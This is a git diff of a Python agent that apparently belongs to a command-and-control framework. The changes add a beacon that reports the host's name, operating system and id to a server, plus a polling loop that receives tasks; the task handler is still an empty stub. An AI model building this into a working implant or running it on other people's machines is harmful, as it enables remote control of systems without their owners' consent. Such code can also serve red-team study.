@@ -3,6 +3,8 @@ from dotenv import load_dotenv
 import os
 import requests
 import time 
+import socket
+import platform
 
 class Agent():
     
@@ -29,13 +31,32 @@ class Agent():
             print(f"[-] FATAL ERROR: {e}")
         
         
+def handle_task(tsk):
+    pass
+ 
+def send_info(url):
+    id, name, os =  me.id, socket.gethostname(), platform.system()
+    res = requests.post(url+"/info", json={"id" : id, "os" : os, "name" : name}, timeout=5)
+    while res.text != "OK":
+        res = requests.post(url+"/info", json={"id" : id, "os" : os, "name" : name}, timeout=5)
+    
+    
+        
 def active_loop(pointurl, agentID, heartbeat):
+    send_info(pointurl)
     
     while True:
         try:
             response = requests.post(pointurl, json={"agent_id" : agentID}, timeout=5)
-            if response == 200:
-                pass # response handling
+            if response.status_code == 200:
+                data = response.json()
+                
+                if data.get("task"):
+                    task = data.get("task")
+                    print(f"[+] Task received: {task}")
+                    handle_task(task)
+                    
+                    
             
         except requests.exceptions.ConnectionError:
             print("[-] Cannot connect to server")
@@ -49,6 +70,6 @@ def active_loop(pointurl, agentID, heartbeat):
         time.sleep(heartbeat)
     
 
-agent = Agent()
+me = Agent()
     
-active_loop(agent.pointurl, agent.id, agent.heartbeat)
+active_loop(me.pointurl, me.id, me.heartbeat)
